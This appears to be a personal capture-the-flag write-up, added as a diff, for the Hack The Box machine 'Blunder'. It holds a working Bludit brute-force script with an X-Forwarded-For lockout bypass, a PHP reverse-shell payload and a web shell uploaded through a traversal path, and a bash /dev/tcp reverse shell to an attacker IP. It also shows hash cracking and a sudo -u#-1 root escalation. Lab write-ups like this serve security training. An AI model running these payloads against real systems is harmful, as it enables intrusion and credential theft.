@@ -1,0 +1,624 @@
+Blunder - Hack the Box - Linux - Login CSRF Token and BruteForcing, Upload of upload of a .htaccess file for php execution.
+
+Open ports: 22 and 80
+
+We look at the source code and we don't find much except for "bl-kernel"
+Will run gobuster
+Commands and Output:
+===================================================================================================================================
+gobuster dir -u http://10.10.10.191 -w /opt/SecLists/Discovery/Web-Content/raft-large-files.txt -b 403,404
+===================================================================================================================================
+
+We get a hint in the foolowing found page:
+http://10.10.10.191/install.php
+"Bludit is already installed ;)"
+"Simple, Fast, Secure, Flat-File CMS "
+Lets check if there is a readme:
+http://10.10.10.191/README.md
+No version though 
+If we kept on guessing we would have found the follwing admin page:
+http://10.10.10.191/admin/
+We just find more info about:
+Commands and Output:
+===================================================================================================================================
+	<link rel="stylesheet" type="text/css" href="http://10.10.10.191/bl-kernel/css/bootstrap.min.css?version=3.9.2">
+===================================================================================================================================
+
+User password is randomized at user install.
+Next thing to do is run a searchsploit on bludit.
+
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/blunder]
+└──╼ $searchsploit bludit
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                          |  Path
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+Bludit  3.9.2 - Authentication Bruteforce Mitigation Bypass                                             | php/webapps/48746.rb
+Bludit - Directory Traversal Image File Upload (Metasploit)                                             | php/remote/47699.rb
+Bludit 3.9.12 - Directory Traversal                                                                     | php/webapps/48568.py
+Bludit 3.9.2 - Auth Bruteforce Bypass                                                                   | php/webapps/48942.py
+Bludit 3.9.2 - Authentication Bruteforce Bypass (Metasploit)                                            | php/webapps/49037.rb
+Bludit 3.9.2 - Directory Traversal                                                                      | multiple/webapps/48701.txt
+bludit Pages Editor 3.0.0 - Arbitrary File Upload                                                       | php/webapps/46060.txt
+-------------------------------------------------------------------------------------------------------- -----------------------------
+===================================================================================================================================
+
+Looking at the metasploit, directory traversal exploit, need username and password.
+Commands and Output:
+===================================================================================================================================
+└──╼ $searchsploit -x php/webapps/46060.txt
+  Exploit: bludit Pages Editor 3.0.0 - Arbitrary File Upload
+      URL: https://www.exploit-db.com/exploits/46060
+     Path: /usr/share/exploitdb/exploits/php/webapps/46060.txt
+File Type: ASCII text, with CRLF line terminators
+
+
+POST /admin/ajax/upload-files HTTP/1.1
+..
+..
+..
+-----------------------------26228568510541774541866388118
+Content-Disposition: form-data; name="tokenCSRF"
+===================================================================================================================================
+
+Chances are authentication is required. And a csrf token is required.
+We turn on burpsuit to intercept and we see that there is csrf token.
+
+Commands and Output:
+===================================================================================================================================
+tokenCSRF=641457483078ee2ab97f2e414bf724fc932ecedd&username=admin&password=pleassub&save=
+===================================================================================================================================
+
+When we send the request to repeater and send the value more than once we get 301 moved permanently message mostly likely indicating
+that we can not replicate the same request. 
+
+Since we don't find anything with searchsploit we will look on online for any other bludit exploits. We come to a web page describing
+a bruteforce attack:
+https://musyokaian.medium.com/bludit-cms-version-3-9-2-brute-force-protection-bypass-283f39a84bbb
+
+We also find a blog post from rastating describing the attack
+https://rastating.github.io/bludit-brute-force-mitigation-bypass/
+
+Apparently after 10 attempt of sending password and username requests, we get blocked by the application.
+The blog explains how to bypass this by manipulating the http header infromation.
+
+To avoid the block we need to append the following along with a valid csrf token:
+Commands and Output:
+===================================================================================================================================
+X-FORWARDED-FOR: 127.0.0.1
+===================================================================================================================================
+
+This in effect helps us avoid the painful ban if bruteforcing the web app.
+We go back to the gobuster and find a todo.txt link with the following text
+Commands and Output:
+===================================================================================================================================
+-Update the CMS
+-Turn off FTP - DONE
+-Remove old users - DONE
+-Inform fergus that the new blog needs images - PENDING
+===================================================================================================================================
+
+fergus could be a potential username
+We will create a python script to automate this:
+If we look at the source code of admin we can see that csrf token value is saved so that can be retrieved and save for each request
+Just hex vales
+Commands and Output:
+===================================================================================================================================
+import requests
+import re
+
+HOST= '10.10.10.191'
+USER= 'fergus'
+
+def init_session():
+    # Return CSRF + session cookie
+    r = requests.get('http://10.10.10.191/admin/')
+    csrf =  re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-f0-9]*)"', r.text)
+    csrf = csrf.group(1)
+    return csrf
+
+print( init_session() )
+===================================================================================================================================
+
+Next thing to do is grab the cookie.
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/blunder]
+└──╼ $python3 
+>>> import requests
+>>> r = requests.get('http://10.10.10.191/admin/')
+>>> r.cookies
+<RequestsCookieJar[Cookie(version=0, name='BLUDIT-KEY', value='qijl73g499cojq76hhnnmco3g5', port=None, port_specified=False, domain='10.10.10.191', domain_specified=False, domain_initial_dot=False, path='/', path_specified=True, secure=False, expires=None, discard=True, comment=None, comment_url=None, rest={'HttpOnly': None}, rfc2109=False)]>
+>>> r.cookies.get('BLUDIT-KEY')
+'qijl73g499cojq76hhnnmco3g5'
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+import requests
+import re
+
+HOST= '10.10.10.191'
+USER= 'fergus'
+PROXY = { 'http': 'http://127.0.0.1:8080'}
+
+def init_session():
+    # Return CSRF + session cookie
+    r = requests.get('http://10.10.10.191/admin/')
+    csrf =  re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-f0-9]*)"', r.text)
+    csrf = csrf.group(1)
+    cookie = r.cookies.get('BLUDIT-KEY')
+    return csrf, cookie
+
+def login(user,password):
+    #tokenCSRF=1942a1691ee18bad659af18428e95dd2ce26a437&username=admin&password=admin&save=
+    csrf, cookie = init_session()
+    data = {
+            'tokenCSRF':csrf,
+            'username': user,
+            'password': password,
+            'save':'' }
+    r = requests.post('http://10.10.10.191/admin/', data=data, proxies=PROXY)
+
+#print( init_session() )
+
+login("hacker", "test")
+===================================================================================================================================
+
+The script works however we still need to add the session cookie otherwise we get a 301 error message
+Commands and Output:
+===================================================================================================================================
+import requests
+import re
+
+HOST= '10.10.10.191'
+USER= 'fergus'
+PROXY = { 'http': 'http://127.0.0.1:8080'}
+
+def init_session():
+    # Return CSRF + session cookie
+    r = requests.get('http://10.10.10.191/admin/')
+    csrf =  re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-f0-9]*)"', r.text)
+    csrf = csrf.group(1)
+    cookie = r.cookies.get('BLUDIT-KEY')
+    return csrf, cookie
+
+def login(user,password):
+    #tokenCSRF=1942a1691ee18bad659af18428e95dd2ce26a437&username=admin&password=admin&save=
+    csrf, cookie = init_session()
+    data = {
+            'tokenCSRF':csrf,
+            'username': user,
+            'password': password,
+            'save':'' }
+    cookies = {
+            'BLUDIT-KEY': cookie
+            }
+    r = requests.post('http://10.10.10.191/admin/', data=data, cookies=cookies, proxies=PROXY)
+
+#print( init_session() )
+
+login("hacker", "test")
+===================================================================================================================================
+
+We add a couple more tests to verify and get the user and password check
+Commands and Output:
+===================================================================================================================================
+import requests
+import re
+
+HOST= '10.10.10.191'
+USER= 'fergus'
+PROXY = { 'http': 'http://127.0.0.1:8080'}
+
+def init_session():
+    # Return CSRF + session cookie
+    r = requests.get(f'http://{HOST}/admin/')
+    csrf =  re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-f0-9]*)"', r.text)
+    csrf = csrf.group(1)
+    cookie = r.cookies.get('BLUDIT-KEY')
+    return csrf, cookie
+
+def login(user,password):
+    #tokenCSRF=1942a1691ee18bad659af18428e95dd2ce26a437&username=admin&password=admin&save=
+    csrf, cookie = init_session()
+    data = {
+            'tokenCSRF':csrf,
+            'username': user,
+            'password': password,
+            'save':'' }
+    cookies = {
+            'BLUDIT-KEY': cookie
+            }
+    r = requests.post(f'http://{HOST}/admin/login', data=data, cookies=cookies, proxies=PROXY, allow_redirects=False)
+    # Username or password incorrect
+    if r.status_code != 200:
+        print('CSRF ERROR')
+    elif "password incorrect" in r.text:
+        return False
+    else:
+        print(f"{USER}:{password}")
+        return True
+
+#print( init_session() )
+
+login("hacker", "test")
+===================================================================================================================================
+
+Now we need to create a wordlist, will cewl to build wordlist from webpage
+
+Commands and Output:
+===================================================================================================================================
+import requests
+import random
+import re
+
+HOST= '10.10.10.191'
+USER= 'fergus'
+PROXY = { 'http': 'http://127.0.0.1:8080'}
+
+def init_session():
+    # Return CSRF + session cookie
+    r = requests.get(f'http://{HOST}/admin/')
+    csrf =  re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-f0-9]*)"', r.text)
+    csrf = csrf.group(1)
+    cookie = r.cookies.get('BLUDIT-KEY')
+    return csrf, cookie
+
+def login(user,password):
+    #tokenCSRF=1942a1691ee18bad659af18428e95dd2ce26a437&username=admin&password=admin&save=
+    csrf, cookie = init_session()
+    headers = {
+            'X-FORWARDED-FOR': f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
+            }
+    data = {
+            'tokenCSRF':csrf,
+            'username': user,
+            'password': password,
+            'save':'' }
+    cookies = {
+            'BLUDIT-KEY': cookie
+            }
+    #r = requests.post(f'http://{HOST}/admin/login', data=data, cookies=cookies, proxies=PROXY, headers=headers, allow_redirects=False)
+    r = requests.post(f'http://{HOST}/admin/login', data=data, cookies=cookies, headers=headers, allow_redirects=False)
+    # Username or password incorrect
+    if r.status_code != 200:
+        print(f'{USER}:{password}')
+        #print('CSRF ERROR')
+        return True
+    elif "password incorrect" in r.text:
+        return False
+    elif "has been blocked" in r.text:
+        print("BLOCKED!")
+        return False
+    else:
+        print(f'{USER}:{password}')
+        return True
+
+#print( init_session() )
+wl = open('words').readlines()
+for line in wl:
+    line = line.strip()
+    if login( USER, line) == True:
+        break
+===================================================================================================================================
+
+Eventualy after running the script we get following creds:
+fergus:RolandDeschain
+
+We can now use them and we are in. Next step is to try and upload a malicious php file and get remote execution.
+We can now look at the other exploits.
+We try to do the php image upload however this fails no matter what php script we upload as an image file.
+So we go back and look at the metasploit module being used. We start metasploit and send it to burp to further analyze so we can 
+do it manually.
+
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/blunder]
+└──╼ $searchsploit bludit
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                          |  Path
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+Bludit  3.9.2 - Authentication Bruteforce Mitigation Bypass                                             | php/webapps/48746.rb
+Bludit - Directory Traversal Image File Upload (Metasploit)                                             | php/remote/47699.rb
+Bludit 3.9.12 - Directory Traversal                                                                     | php/webapps/48568.py
+Bludit 3.9.2 - Auth Bruteforce Bypass                                                                   | php/webapps/48942.py
+Bludit 3.9.2 - Authentication Bruteforce Bypass (Metasploit)                                            | php/webapps/49037.rb
+Bludit 3.9.2 - Directory Traversal                                                                      | multiple/webapps/48701.txt
+bludit Pages Editor 3.0.0 - Arbitrary File Upload                                                       | php/webapps/46060.txt
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+===================================================================================================================================
+
+We enter metasploit and set the proxy to burp as well as update all option paramaters and from there go through the exploit flow.
+
+Commands and Output:
+===================================================================================================================================
+POST /admin/ajax/upload-images HTTP/1.1
+Host: 10.10.10.191
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+Cookie: BLUDIT-KEY=fo0q9pn30860mdf44kfusb5bb3;
+X-Requested-With: XMLHttpRequest
+Content-Type: multipart/form-data; boundary=_Part_635_3601422290_2769013529
+Content-Length: 1537
+Connection: close
+
+--_Part_635_3601422290_2769013529
+Content-Disposition: form-data; name="images[]"; filename="fFHPNHkKjN.png"
+Content-Type: image/png
+
+<?php @unlink(__FILE__);/*<?php /**/ error_reporting(0); $ip = '10.10.14.8'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die(); ?>
+
+--_Part_635_3601422290_2769013529
+Content-Disposition: form-data; name="uuid"
+
+../../tmp
+--_Part_635_3601422290_2769013529
+Content-Disposition: form-data; name="tokenCSRF"
+
+827b29b54009df5ba17dc073fc41a96b302906e3
+--_Part_635_3601422290_2769013529--
+
+===================================================================================================================================
+
+We see the location of the file upload as well as the fact that the file upload is a png file.
+
+Commands and Output:
+===================================================================================================================================
+POST /admin/ajax/upload-images HTTP/1.1
+Host: 10.10.10.191
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+Cookie: BLUDIT-KEY=gil8tgtgqsu7v2orhuggumi4i2;
+X-Requested-With: XMLHttpRequest
+Content-Type: multipart/form-data; boundary=_Part_305_800037286_1925121720
+Content-Length: 470
+Connection: close
+
+--_Part_305_800037286_1925121720
+Content-Disposition: form-data; name="images[]"; filename=".htaccess"
+Content-Type: image/png
+
+RewriteEngine off
+AddType application/x-httpd-php .png
+
+--_Part_305_800037286_1925121720
+Content-Disposition: form-data; name="uuid"
+
+8fbb28c90d57ba0db3c19095957d6dcd
+--_Part_305_800037286_1925121720
+Content-Disposition: form-data; name="tokenCSRF"
+
+20e9b7cc2fe82d457aeef514b09fe809a7094f2a
+--_Part_305_800037286_1925121720--
+===================================================================================================================================
+
+One thing to note is that through the images upload we can apparently modify the .htaccess file and make it so that png image files
+area able to execute php through the add type rule being overwritten to the file.
+
+We can now do this manually and get a reverse shell without the need of metasploit.
+The key thing is to make sure to overwite the .htaccess file under tmp and then upload the php command injection code or reverse
+shell in the same tmp directory.
+
+Commands and Output:
+===================================================================================================================================
+POST /admin/ajax/upload-images HTTP/1.1
+Host: 10.10.10.191
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Content-Type: multipart/form-data; boundary=---------------------------370904629718955547573463279891
+Content-Length: 553
+Origin: http://10.10.10.191
+DNT: 1
+Connection: close
+Referer: http://10.10.10.191/admin/new-content
+Cookie: BLUDIT-KEY=k7s3qgq6suroqdgth16jc9nuk6
+Sec-GPC: 1
+
+-----------------------------370904629718955547573463279891
+Content-Disposition: form-data; name="images[]"; filename=".htaccess"
+Content-Type: image/png
+
+RewriteEngine off
+AddType application/x-httpd-php .png
+
+-----------------------------370904629718955547573463279891
+
+Content-Disposition: form-data; name="uuid"
+
+../../tmp
+
+-----------------------------370904629718955547573463279891
+
+Content-Disposition: form-data; name="tokenCSRF"
+
+024820802db064468ae41e1137bb06206be6bab8
+
+-----------------------------370904629718955547573463279891--
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+POST /admin/ajax/upload-images HTTP/1.1
+Host: 10.10.10.191
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Content-Type: multipart/form-data; boundary=---------------------------40137745582962038712448156903
+Content-Length: 526
+Origin: http://10.10.10.191
+DNT: 1
+Connection: close
+Referer: http://10.10.10.191/admin/new-content
+Cookie: BLUDIT-KEY=k7s3qgq6suroqdgth16jc9nuk6
+Sec-GPC: 1
+
+-----------------------------40137745582962038712448156903
+Content-Disposition: form-data; name="images[]"; filename="slyecho.png"
+Content-Type: image/png
+
+<?php system($_GET['cmd']);?>
+
+-----------------------------40137745582962038712448156903
+
+Content-Disposition: form-data; name="uuid"
+
+../../tmp
+
+-----------------------------40137745582962038712448156903
+
+Content-Disposition: form-data; name="tokenCSRF"
+
+024820802db064468ae41e1137bb06206be6bab8
+
+-----------------------------40137745582962038712448156903--
+===================================================================================================================================
+
+We do some command injection with burp and can forumalte it to get a reverse shell
+
+Commands and Output:
+===================================================================================================================================
+GET /bl-content/tmp/slyecho.png?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.8/9001+0>%261' HTTP/1.1
+Host: 10.10.10.191
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Cookie: BLUDIT-KEY=k7s3qgq6suroqdgth16jc9nuk6
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/blunder]
+└──╼ $nc -lnvp 9001
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::9001
+Ncat: Listening on 0.0.0.0:9001
+Ncat: Connection from 10.10.10.191.
+Ncat: Connection from 10.10.10.191:47072.
+bash: cannot set terminal process group (1115): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ 
+===================================================================================================================================
+
+Once in we look at the files adn notice there is a new version of bludit, and if we look at the database which is just a bunch of
+php files we find a new user hugo and what looks to be a hash.
+
+Commands and Output:
+===================================================================================================================================
+www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php 
+<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
+{
+    "admin": {
+        "nickname": "Hugo",
+        "firstName": "Hugo",
+        "lastName": "",
+        "role": "User",
+        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
+        "email": "",
+        "registered": "2019-11-27 07:40:55",
+        "tokenRemember": "",
+        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
+        "tokenAuthTTL": "2009-03-15 14:00",
+        "twitter": "",
+        "facebook": "",
+        "instagram": "",
+        "codepen": "",
+        "linkedin": "",
+        "github": "",
+        "gitlab": ""}
+}
+===================================================================================================================================
+
+In the earlier version bludit we also find the admins hash as well.
+Commands and Output:
+===================================================================================================================================
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/databases$ cat users.php 
+<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
+{
+    "admin": {
+        "nickname": "Admin",
+        "firstName": "Administrator",
+        "lastName": "",
+        "role": "admin",
+        "password": "bfcc887f62e36ea019e3295aafb8a3885966e265",
+        "salt": "5dde2887e7aca",
+        "email": "",
+        "registered": "2019-11-27 07:40:55",
+        "tokenRemember": "",
+        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
+        "tokenAuthTTL": "2009-03-15 14:00",
+        "twitter": "",
+        "facebook": "",
+        "instagram": "",
+        "codepen": "",
+        "linkedin": "",
+        "github": "",
+        "gitlab": ""
+    },
+===================================================================================================================================
+
+We can now attempt to crack them, by the looks they seem to be sha1sum hashes unsalted.
+
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/blunder]
+└──╼ $echo -n bfcc887f62e36ea019e3295aafb8a3885966e265 | wc -c
+40
+
+┌─[user@parrot-virtual]─[~/htb/blunder]
+└──╼ $echo -n test | sha1sum | cut -d ' ' -f1 | wc -c
+41
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+~/hashcat$ hashcat -m 100 bludit rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+hashcat (v4.0.1) starting...
+
+* Device #1: WARNING! Kernel exec timeout is not disabled.
+             This may cause "CL_OUT_OF_RESOURCES" or related errors.
+             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
+nvmlDeviceGetFanSpeed(): Not Supported
+..
+..
+..
+
+- Device #1: autotuned kernel-accel to 1024               
+- Device #1: autotuned kernel-loops to 19
+[s]tatus [p]ause [r]esume [b]ypass [c]heckpoint [q]uit => [s]tatus [p]ause [r]esume [b]ypass [c]heckfaca404fd5c0a31cf1897b823c695c85cffeb98d:Password120      
+===================================================================================================================================
+
+The password for hugo being:
+faca404fd5c0a31cf1897b823c695c85cffeb98d:Password120
+
+Once in we perform a sudo -l to see what we can do using hugo's password
+Commands and Output:
+===================================================================================================================================
+hugo@blunder:~$ sudo -l
+Matching Defaults entries for hugo on blunder:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User hugo may run the following commands on blunder:
+    (ALL, !root) /bin/bash
+===================================================================================================================================
+
+Based on the output we most likely perform a sudo underflow attack by simply specifying the following:
+-u#-1
+Commands and Output:
+===================================================================================================================================
+hugo@blunder:~$ sudo -u#-1 /bin/bash
+root@blunder:/home/hugo# id
+uid=0(root) gid=1001(hugo) groups=1001(hugo)
+root@blunder:/home/hugo# 
+===================================================================================================================================
+
